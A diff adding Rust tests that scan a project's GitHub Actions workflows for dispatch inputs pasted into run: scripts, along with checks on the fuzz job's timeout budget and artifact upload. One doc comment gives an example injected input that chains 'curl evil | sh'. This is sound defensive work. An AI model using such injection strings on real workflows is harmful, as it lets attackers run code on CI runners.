@@ -2316,3 +2316,164 @@ jobs:
         assert_eq!(checking_debug_runs(yaml), Vec::<String>::new());
     }
 }
+
+// ---------------------------------------------------------------- dispatch inputs
+
+/// Every `${{ ... }}` expression in `run` that reads a workflow input.
+///
+/// GitHub substitutes an expression into a `run:` script BEFORE the shell
+/// sees it, so an input quoted there is not a shell string: `"${{
+/// inputs.seconds }}"` given `1"; curl evil | sh; "` is three commands.
+/// An input reaches a step safely only through `env:`, where the shell
+/// receives it as a variable's value and never parses it (#304).
+fn inputs_interpolated(run: &str) -> Vec<String> {
+    let mut found = Vec::new();
+    let mut rest = run;
+    while let Some(open) = rest.find("${{") {
+        let after = &rest[open + 3..];
+        let Some(close) = after.find("}}") else {
+            break;
+        };
+        let expression = after[..close].trim();
+        if expression
+            .split(|c: char| !(c.is_alphanumeric() || c == '.' || c == '_'))
+            .any(|word| word.starts_with("inputs.") || word.starts_with("github.event.inputs."))
+        {
+            found.push(format!("${{{{ {expression} }}}}"));
+        }
+        rest = &after[close + 2..];
+    }
+    found
+}
+
+/// Every step of every job in `workflow` whose `run:` interpolates an input.
+fn steps_interpolating_inputs(workflow: &str, path: &Path) -> Vec<String> {
+    let document = load_document(workflow, path);
+    let Some(jobs) = field(&document, "jobs").and_then(Yaml::as_mapping) else {
+        panic!("{} has no jobs", path.display());
+    };
+    let mut offending = Vec::new();
+    for (name, job) in jobs {
+        let name = name.as_str().unwrap_or("?");
+        for step in steps_of(job, name) {
+            for expression in inputs_interpolated(run_of(step)) {
+                offending.push(format!("jobs.{name}: {expression}"));
+            }
+        }
+    }
+    offending
+}
+
+/// No workflow pastes a dispatch input into a shell script (#304).
+///
+/// Every workflow, not only fuzz.yml: the next `workflow_dispatch` input
+/// added anywhere is the same injection.
+#[test]
+fn no_run_step_interpolates_a_workflow_input() {
+    let dir = manifest_dir().join(".github").join("workflows");
+    let entries =
+        std::fs::read_dir(&dir).unwrap_or_else(|e| panic!("cannot list {}: {e}", dir.display()));
+    let mut read = 0;
+    let mut offending = Vec::new();
+    for entry in entries {
+        let path = entry.expect("a directory entry").path();
+        if path.extension().and_then(|e| e.to_str()) != Some("yml") {
+            continue;
+        }
+        read += 1;
+        for hit in steps_interpolating_inputs(&read_or_panic(&path), &path) {
+            offending.push(format!("{}: {hit}", path.display()));
+        }
+    }
+    assert!(read > 0, "no workflows found under {}", dir.display());
+    assert!(
+        offending.is_empty(),
+        "these run: steps paste a workflow input into the shell, so whoever can \
+         dispatch the workflow can run commands on the runner. Pass the input \
+         through the step's env: and read it as a variable instead:\n{}",
+        offending.join("\n")
+    );
+}
+
+/// The job's time limit in seconds, and the fuzzing budget
+/// `scripts/fuzz-all.sh` enforces.
+fn fuzz_budgets() -> (u64, u64) {
+    let path = workflow_path("fuzz.yml");
+    let workflow = read_or_panic(&path);
+    let document = load_document(&workflow, &path);
+    let timeout = field(job(&document, "fuzz", &path), "timeout-minutes")
+        .and_then(Yaml::as_integer)
+        .unwrap_or_else(|| panic!("{} jobs.fuzz has no timeout-minutes", path.display()));
+    let script = read_or_panic(&manifest_dir().join("scripts").join("fuzz-all.sh"));
+    let budget = script
+        .lines()
+        .find_map(|l| l.trim().strip_prefix("total_budget="))
+        .and_then(|v| v.trim().parse::<u64>().ok())
+        .expect("scripts/fuzz-all.sh sets total_budget=<seconds>");
+    (
+        u64::try_from(timeout).expect("a positive timeout") * 60,
+        budget,
+    )
+}
+
+/// The fuzzing budget leaves room inside the job's timeout for the build
+/// and the reproducer upload, so a dispatch can never run the job into
+/// its timeout with a finding still on the runner (#304).
+#[test]
+fn the_fuzz_budget_fits_inside_the_fuzz_jobs_timeout() {
+    let (timeout, budget) = fuzz_budgets();
+    // Building cargo-fuzz uncached, and each target under the sanitizer,
+    // is most of half an hour on a GitHub runner.
+    let headroom = 30 * 60;
+    assert!(
+        budget + headroom <= timeout,
+        "scripts/fuzz-all.sh allows {budget}s of fuzzing, which with {headroom}s for \
+         the builds does not fit fuzz.yml's {timeout}s timeout"
+    );
+}
+
+/// The reproducers are kept when the run is cancelled or times out, not
+/// only when a step fails: a run stopped at its timeout still holds every
+/// crash the earlier targets found (#304).
+#[test]
+fn the_fuzz_reproducers_are_kept_on_a_cancelled_run() {
+    let path = workflow_path("fuzz.yml");
+    let workflow = read_or_panic(&path);
+    let document = load_document(&workflow, &path);
+    let fuzz = job(&document, "fuzz", &path);
+    let upload = steps_of(fuzz, "fuzz")
+        .iter()
+        .find(|s| is_artifact_step(s, "upload-artifact", "fuzz-artifacts"))
+        .unwrap_or_else(|| panic!("{} uploads no fuzz-artifacts", path.display()));
+    let condition = field(upload, "if").and_then(Yaml::as_str).unwrap_or("");
+    let words: String = condition.split_whitespace().collect();
+    assert!(
+        words.contains("failure()") && words.contains("cancelled()"),
+        "{}: the fuzz-artifacts upload runs on `{condition}`; it must run on \
+         `failure() || cancelled()`, or a timed-out run throws its reproducers away",
+        path.display()
+    );
+}
+
+mod dispatch_inputs {
+    use super::inputs_interpolated;
+
+    #[test]
+    fn an_input_in_a_run_script_is_found() {
+        assert_eq!(
+            inputs_interpolated("./scripts/fuzz-all.sh \"${{ inputs.seconds || '120' }}\""),
+            vec!["${{ inputs.seconds || '120' }}"]
+        );
+        assert_eq!(
+            inputs_interpolated("echo ${{github.event.inputs.x}}"),
+            vec!["${{ github.event.inputs.x }}"]
+        );
+    }
+
+    #[test]
+    fn other_expressions_and_env_reads_are_not() {
+        assert!(inputs_interpolated("./scripts/fuzz-all.sh \"$SECONDS_PER_TARGET\"").is_empty());
+        assert!(inputs_interpolated("echo ${{ matrix.os }} ${{ runner.arch }}").is_empty());
+        assert!(inputs_interpolated("echo ${{ steps.myinputs.outputs.x }}").is_empty());
+    }
+}
